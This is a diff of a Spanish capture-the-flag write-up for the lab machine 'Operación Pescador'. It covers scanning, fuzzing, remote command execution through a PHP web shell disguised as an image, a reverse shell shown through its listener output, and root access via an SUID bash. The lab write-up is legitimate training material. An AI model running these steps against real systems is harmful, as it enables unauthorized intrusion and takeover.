@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Operación Pescador 
+---
+icon: linux
+---
 
-**Plataforma:** The Hackers Labs  
-**Sistema Operativo:** Linux  
+# Operación Pescador ​​
+
+## 🖥️ Writeup - Operación Pescador
+
+**Plataforma:** The Hackers Labs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Gobuster` `Wfuzz` `RCE` `Web Shell` `SUID`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el archivo `zip` que contiene la `.ova` de la máquina Operación Pescador, lo extraemos y la importamos en VirtualBox.
 
 Configuramos la interfaz de red de la máquina Operación Pescador y la iniciamos junto a nuestra máquina atacante.
 
-# RECONOCIMIENTO DE HOSTS
+## RECONOCIMIENTO DE HOSTS
 
 En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,23 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:6f:3d:92      1      60  PCS Systemtechnik GmbH      
  10.0.4.39       08:00:27:80:8c:91      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 Identificamos con seguridad que la `IP` de la víctima es `10.0.4.39`.
 
-# ESCANEO DE PUERTOS    
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.39
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.39
 ```
 
 Info:
+
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-22 23:29 +0100
 Nmap scan report for 10.0.4.39
@@ -83,10 +92,9 @@ ff02::2 ip6-allrouters
 
 Accedemos al puerto `80` y nos encontramos con un panel de `inicio de sesión` y un mensaje que nos indica que probablemente no podamos hacer `fuerza bruta`.
 
-![alt text](../../images/innovasolutions.png)
+![alt text](../../.gitbook/assets/innovasolutions.png)
 
-
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -95,6 +103,7 @@ gobuster dir -u http://mail.innovasolutions.thl -w /usr/share/seclists/Discovery
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -122,12 +131,11 @@ Progress: 252599 / 1543906 (16.36%)
 
 Encontramos una carpeta `/uploads` con un tamaño de respuesta de 338. Accedemos y vemos el siguiente archivo:
 
-![alt text](../../images/pngphp.png)
+![alt text](../../.gitbook/assets/pngphp.png)
 
 El contenido parece ser el de una imagen, pero la extensión es `.php`.
 
-
-# EXPLOTACIÓN (RCE)
+## EXPLOTACIÓN (RCE)
 
 Vamos a utilizar `Wfuzz` para intentar dar con un parámetro que nos permita un `LFI` (Local File Inclusion) o `RCE` (Remote Code Execution).
 
@@ -136,6 +144,7 @@ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_dire
 ```
 
 Info:
+
 ```
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -159,7 +168,7 @@ Modificamos la `URL` para incluir el comando `id`.
 http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=id
 ```
 
-![alt text](../../images/idrce.png)
+![alt text](../../.gitbook/assets/idrce.png)
 
 ¡Funciona! Tenemos ejecución remota de comandos.
 
@@ -184,6 +193,7 @@ Aplicamos `URL encoding` para evitar problemas.
 ```
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [10.0.4.12] from (UNKNOWN) [10.0.4.39] 50076
@@ -196,28 +206,33 @@ bash-5.2$
 
 Al ejecutar, recibimos al instante la `shell` como el usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de `TTY` para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Comprobamos permisos `sudo` y `SUID`.
 
@@ -226,6 +241,7 @@ find / -perm -4000 -type f 2>/dev/null
 ```
 
 Info:
+
 ```
 /usr/local/bin/get-report
 /usr/bin/chsh
@@ -249,6 +265,7 @@ Vemos que tenemos el `bit SUID` activo en el binario `bash`, por lo que escalar 
 ```
 
 Info:
+
 ```
 bash-5.2# whoami
 root
